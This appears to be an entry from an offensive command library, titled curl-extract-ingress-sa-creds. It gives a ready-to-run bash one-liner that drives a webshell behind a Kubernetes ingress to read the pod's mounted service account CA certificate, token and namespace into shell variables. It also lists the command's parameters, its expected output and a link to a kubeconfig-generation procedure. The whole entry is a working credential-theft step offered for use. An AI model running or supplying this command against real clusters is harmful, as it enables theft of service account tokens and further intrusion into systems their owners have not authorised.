---
data: >-
  ca=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=base64
  /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -w 0"); token=$(curl -s
  -H "host: x.x" $ingress/z/ -d "cmd=cat
  /var/run/secrets/kubernetes.io/serviceaccount/token"); namespace=$(curl -s -H
  "host: x.x" $ingress/z/ -d "cmd=cat
  /var/run/secrets/kubernetes.io/serviceaccount/namespace")
tags:
  - token-theft
  - rce
type: command
output: 'Variables set with CA, token, namespace values'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.870Z'
id: 27e64716-934a-4d6e-bbd9-bcd85ca5f73a
verified: false
validated: true
submitted: true
---
# curl-extract-ingress-sa-creds

## Command

```bash
ca=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=base64 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -w 0"); token=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"); namespace=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/namespace")
```

## Description

Uses the webshell to extract service account credentials from the pod's mounted secrets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d "cmd=..."` | Command to run for each extraction | Yes |
| `$ingress` | Variable for ingress URL (e.g., localhost) | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

Shell variables populated; echo $token shows JWT.

## Related

- [[procedures/Extract-Service-Account-Tokens-and-Generate-Kubeconfig]]
